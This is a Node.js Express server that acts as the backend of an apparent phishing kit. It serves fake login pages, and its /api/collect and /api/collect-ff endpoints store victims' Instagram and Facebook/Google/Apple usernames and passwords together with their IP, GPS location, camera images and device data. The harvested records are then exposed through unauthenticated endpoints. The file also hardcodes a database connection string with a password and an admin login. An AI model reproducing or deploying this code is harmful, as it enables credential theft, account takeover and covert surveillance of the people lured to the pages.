const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '10mb' }));
app.use(cors());
app.use(express.static(__dirname));

// MongoDB Connection
const MONGO_URI = "mongodb+srv://ktalpada484_db_user:sumit1123@cluster0.zjkzamc.mongodb.net/?appName=Cluster0";

mongoose.connect(MONGO_URI)
    .then(() => console.log("MongoDB Connected Successfully! Data is permanent."))
    .catch(err => console.log("DB Connection Error: ", err));

// 1. Standard Instagram Log Schema
const LogSchema = new mongoose.Schema({
    id: String,
    ip: String,
    instagram_username: String,
    instagram_password: String,
    latitude: String,
    longitude: String,
    image_base64: String,
    system: Object,
    timestamp: { type: Date, default: Date.now }
});
const LogModel = mongoose.model('Log', LogSchema);

// 2. Free Fire (Facebook/Google/Apple) Log Schema
const FFLogSchema = new mongoose.Schema({
    id: String,
    ip: String,
    platform: String,
    instagram_username: String,
    instagram_password: String,
    latitude: String,
    longitude: String,
    image_base64: String,
    system: Object,
    timestamp: { type: Date, default: Date.now }
});
const FFLogModel = mongoose.model('FFLog', FFLogSchema);

// Routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/facebook.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'facebook.html'));
});

app.get('/viewer.html', (req, res) => {
    res.sendFile(path.join(__dirname, 'viewer.html'));
});

// Admin Login Check
app.post('/api/admin-login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'sumit@1123' && password === 'sumit1123') {
        res.status(200).json({ status: 'success', message: 'Login Successful' });
    } else {
        res.status(401).json({ status: 'error', message: 'Invalid Credentials' });
    }
});

// Instagram Data Collect
app.post('/api/collect', async (req, res) => {
    try {
        const recordId = 'ID_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const loc = req.body.location || { latitude: 'N/A', longitude: 'N/A' };

        const newLog = new LogModel({
            id: recordId,
            ip: clientIp,
            instagram_username: req.body.instagram_username || 'N/A',
            instagram_password: req.body.instagram_password || 'N/A',
            latitude: loc.latitude,
            longitude: loc.longitude,
            image_base64: req.body.image_base64 || null,
            system: req.body.system || {}
        });

        await newLog.save();
        res.status(200).json({ status: 'success' });
    } catch (err) {
        res.status(500).json({ status: 'error', error: err.message });
    }
});

// Free Fire Data Collect (Facebook, Google, Apple)
app.post('/api/collect-ff', async (req, res) => {
    try {
        const recordId = 'FF_' + Date.now() + '_' + Math.floor(Math.random() * 1000);
        const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const loc = req.body.location || { latitude: 'N/A', longitude: 'N/A' };

        const newFFLog = new FFLogModel({
            id: recordId,
            ip: clientIp,
            platform: req.body.platform || 'Unknown',
            instagram_username: req.body.instagram_username || 'N/A',
            instagram_password: req.body.instagram_password || 'N/A',
            latitude: loc.latitude,
            longitude: loc.longitude,
            image_base64: req.body.image_base64 || null,
            system: req.body.system || {}
        });

        await newFFLog.save();
        res.status(200).json({ status: 'success' });
    } catch (err) {
        res.status(500).json({ status: 'error', error: err.message });
    }
});

// Get Standard Data
app.get('/api/get-data', async (req, res) => {
    try {
        const logs = await LogModel.find().sort({ timestamp: -1 });
        let dataObj = {};
        logs.forEach(log => { dataObj[log.id] = log; });
        res.status(200).json(dataObj);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// Get Free Fire Data
app.get('/api/get-ff-data', async (req, res) => {
    try {
        const logs = await FFLogModel.find().sort({ timestamp: -1 });
        let dataObj = {};
        logs.forEach(log => { dataObj[log.id] = log; });
        res.status(200).json(dataObj);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
